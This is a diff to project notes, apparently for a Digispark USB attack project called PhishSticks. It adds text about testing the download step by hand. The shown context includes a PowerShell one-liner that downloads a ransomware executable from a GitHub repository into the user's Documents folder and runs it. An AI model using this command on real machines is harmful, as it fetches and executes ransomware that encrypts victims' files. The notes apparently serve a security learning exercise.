@@ -86,7 +86,9 @@ TO DO:
 
 I started up with modifying the previous application to only encrypt .txt and image files, just to be more safe when playing around.
 
-Powershell command to download the exe to users Documents folder and start it after downloading has finished:
+First goal was to download and execute the file with powershell commands manually to see and test how it works before putting the commands inside Digispark.
+
+Powershell command to manually download the exe to users Documents folder and start it after downloading has finished:
 ```Powershell
 Invoke-WebRequest -OutFile "$env:UserProfile/Documents/malware.exe" -Uri "https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe";Start-Process $env:UserProfile/Documents/malware.exe -WorkingDir $env:UserProfile/Documents
 ```
